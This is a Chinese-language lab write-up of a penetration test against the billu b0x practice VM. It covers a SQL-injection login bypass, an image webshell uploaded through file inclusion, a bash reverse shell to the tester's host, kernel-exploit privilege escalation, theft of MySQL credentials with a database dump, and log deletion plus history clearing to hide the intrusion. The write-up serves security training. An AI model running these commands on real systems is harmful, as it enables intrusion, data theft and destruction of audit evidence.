---
# 当前页面内容标题
title: billu b0x测试
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - 日常
tabs: 
    - 靶场练习
    - 渗透测试
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
date: 2023-02-16
# 浏览量
pageview: true
---
# billu b0x渗透测试

## 一、信息收集

1. 使用namp扫描

   1. 扫描主机

      ```sh
      192.168.235.134
      ```

   2. 扫描端口

      ```sh
      22/tcp open
      80/tcp open
      ```

2. 使用Nessus扫描

   ![image-20221021213158423](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021213158423.png)

3. 使用AWVS扫描

   ![image-20221021213212472](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021213212472.png)

## 二、代码审计

尝试访问AWVS扫描出来的路径，当访问到test.php时，提示我`file`参数需要文件路径

![image-20221021213523885](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021213523885.png)

尝试使用get请求，没有反应。使用post请求，并设置`/etc/passwd`的路径，然后服务器响应了一个文件回来

![image-20221021213658537](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021213658537.png)

尝试获取源代码

1. index.php
2. test.php
3. c.php

![image-20221021215445570](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021215445570.png)

查看`test.php`，发现服务器没有对参数进行防护，所以尝试使用伪协议，但是没有任何响应。所以暂时跳过

```php
<?php
function file_download($download)
{
	if(file_exists($download)){
		header("Content-Description: File Transfer"); 
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
		header('Accept-Ranges: bytes');
		header('Content-Disposition: attachment; filename="'.basename($download).'"'); 
		header('Content-Length: ' . filesize($download));
		header('Content-Type: application/octet-stream'); 
		ob_clean();
		flush();
		readfile ($download);
	else{
		echo "file not found";	
	}
	
}
if(isset($_POST['file'])){
	file_download($_POST['file']);
}
else{
	echo '\'file\' parameter is empty. Please provide file path in \'file\' parameter ';
}
```

查看`c.php`，发现mysql的账号信息，但是只能用于本地登录

```php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
{
  echo "connection failed ->  " . mysqli_connect_error();
}

?>

```

查看`index.php`

```php
<?php
session_start();

include('c.php');
include('head.php');
if(@$_SESSION['logged']!=true)
{
	$_SESSION['logged']='';
}
if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
{
	echo "you are logged in :)";
	header('Location: panel.php', true, 302);
}
else
{
	echo '<div align=center style="margin:30px 0px 0px 0px;">
	<font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
	<br><br>
	Show me your SQLI skills <br>
	<form method=post>
	Username :- <Input type=text name=un> &nbsp Password:- <input type=password 	name=ps> <br><br>
	<input type=submit name=login value="let\'s login">';
}
if(isset($_POST['login']))
{
	$uname=str_replace('\'','',urldecode($_POST['un']));
	$pass=str_replace('\'','',urldecode($_POST['ps']));
	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
	$result = mysqli_query($conn, $run);
    if (mysqli_num_rows($result) > 0) {

        $row = mysqli_fetch_assoc($result);
        echo "You are allowed<br>";
        $_SESSION['logged']=true;
        $_SESSION['admin']=$row['username'];
         header('Location: panel.php', true, 302);

    }else{
        echo "<script>alert('Try again');</script>";
    }
}
echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";

?>
```

在这里可以看到，登录时的校验方式，就是单纯的把单引号转换为空，这里可以使用转义来绕过

```sql
select * from auth where  pass='\' and uname=' or 1=1 limit 0,1-- '
```

![image-20221021221810504](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021221810504.png)

尝试登录

![image-20221021221926077](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021221926077.png)

出现了新的页面，`http://192.168.235.134/panel.php`尝试先下载panel.php的代码

```php
<?php
session_start();
include('c.php');
// 当前目录下，还有一个head2.php的文件
include('head2.php');
// 判断是否登录
if(@$_SESSION['logged']!=true )
{
	header('Location: index.php', true, 302);
	exit();
}
echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
// 判断是否退出登录
if(isset($_POST['lg']))
{
	unset($_SESSION['logged']);
	unset($_SESSION['admin']);
	header('Location: index.php', true, 302);
}
echo '<hr><br>';
echo '<form method=post>
<select name=load>
    <option value="show">Show Users</option>
	<option value="add">Add User</option>
</select> 
&nbsp<input type=submit name=continue value="continue"></form><br><br>';
// 选择模式，post参数中的load为show时显示用户，add时添加用户
// 这说明该目录还有两个文件show.php和add.php
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	if($choice==='add')
	{
		include($dir.'/'.$choice.'.php');
		die();
	}
    if($choice==='show')
	{  
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
        // 这里有文件包含漏洞，可以上传文件马
		include($dir.'/'.$_POST['load']);
	}
	
}
// 插入数据
if(isset($_POST['upload']))
{	
    // 转义name、address和id中的特殊字符
    $name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);
    // 判断图片是否为空
	if(!empty($_FILES['image']['name']))
	{
        // 去除文件名称里的特殊字符
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
        // 获取文件名称的后缀
		$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
        // 设置后缀白名单
		$image=array('jpeg','jpg','gif','png');
		if(in_array($r,$image)){
            // 该类为fileinfo函数提供了面向对象的接口
			$finfo = @new finfo(FILEINFO_MIME); 
            // 返回文件类型
			$filetype = @$finfo->file($_FILES['image']['tmp_name']);
            // 正则匹配文件类型，允许类型有jpeg、png和gif
			if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
			{
                    // 上传文件
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
					{
						echo "Uploaded successfully ";
                        // 插入数据，这里使用注释应该可以注入
						$update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
						mysqli_query($conn, $update);	  
					}
			}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
		}
        else
        {
            echo "<br>only png,jpg and gif file are allowed";	
        }
	}
}
?>
```

## 三、开始渗透

从刚刚的的代码审计中，发现了一个文件包含漏洞。因为代码没有进行二次渲染，所以这里直接上传一个图片马

![image-20221021225712144](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021225712144.png)

图片马上传成功，并获取图片地址

![image-20221021225729401](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021225729401.png)

![image-20221021225826978](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021225826978.png)

验证图片马是否正常运行

![image-20221021225912353](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021225912353.png)

使用反弹shell

首先在kali启动4444监听端口

![image-20221021232045019](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021232045019.png)

然后通过图片马，执行反弹命令

```php
bash -c "bash -i >&  /dev/tcp/192.168.66.138/1111 0>&1"
```

![image-20221021235828790](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021235828790.png)

获取用户和系统信息

![image-20221021235958736](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221021235958736.png)

### 1）、漏洞扫描

使用`scp`远程下载攻击主机下的`linux-exploit-suggester.sh`工具，对该系统进行漏洞扫描

因为要输入密码，所以需要使用`python`进入交互模式

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

开始上传

```shell
www-data@indishell:/tmp$ scp shihao@192.168.235.130:/tmp/les.sh /tmp/
```

![image-20221022005248176](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022005248176.png)

添加执行权限，并运行

```php
www-data@indishell:/tmp$ chmod +x les.sh
chmod +x les.sh
www-data@indishell:/tmp$ ./les.sh
```

![image-20221022005621399](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022005621399.png)

### 2）、尝试提权

1. 首先尝试使用第一个40611漏洞
![image-20221022005827580](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022005827580.png)下载文件

   ```
   https://www.exploit-db.com/download/40611
   ```

   获取使用方法
  ![image-20221022005937259](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022005937259.png)失败![image-20221022020350561](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022020350561.png)

2. 第二个，37292漏洞

   ![image-20221022020530054](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022020530054.png)

   在kali上面查找`37292`的`poc`

   ![image-20221022021058426](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022021058426.png)

   ![image-20221022021152143](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022021152143.png)

   复制到`/tmp`里，方便目标主机下载，用法是直接编译

   ```shell
   gcc 37292.c -o poc
   ```

   ![image-20221022021251151](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022021251151.png)

   成功

   创建root用户

   ![image-20221022021556423](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022021556423.png)

   使用`xshell`登录系统

   ![image-20221022021825218](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022021825218.png)

### 3）、开始拖库

在代码审计时，获取到了一个mysql的用户账号和密码，但是只能访问自己的数据库，我想要获取其他数据库的信息，就必须要有相应的数据库权限

下面我获取权限的方法：

1. 跳过权限验证，缺陷是要重启mysql服务，动静太大。决定用其他办法

   ![image-20221022022519028](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022022519028.png)

   ![image-20221022022352444](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022022352444.png)

   ![image-20221022022951311](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022022951311.png)

2. 找到其他账号，或爆破密码

   在修改`my.cnf`时，发现一个debian.cnf的文件，内容如下

   ![image-20221022113103373](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022113103373.png)

   这里面存放着`mysql`另外一个账号的用户名和密码，尝试登录，这个账号的的权限很、、。

   ![image-20221022125947749](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022125947749.png)

   ![image-20221022113643071](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022113643071.png)

   查询root密码

   ```sql
   mysql> SHOW GRANTS FOR 'root'@'localhost';
   ```

   ![image-20221022114144929](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022114144929.png)

   尝试破解，找到了，但是要钱

   ![image-20221022114215882](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022114215882.png)

使用`debian-sys-maint`登录到`phpmyadmin`，导出sql文件

![image-20221022135941038](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022135941038.png)

## 四、入侵痕迹清理

查找log文件，并修改里面内容或直接删除

```sh
root@indishell:/# find / -mtime -2 | grep '\.log'
```

![image-20221022141918285](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022141918285.png)

```php
root@indishell:/# rm -rf $(find / -mtime -2 | grep '\.log')
```

![image-20221022142344518](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221022142344518.png)

去除命令历史记录

```
history -c
```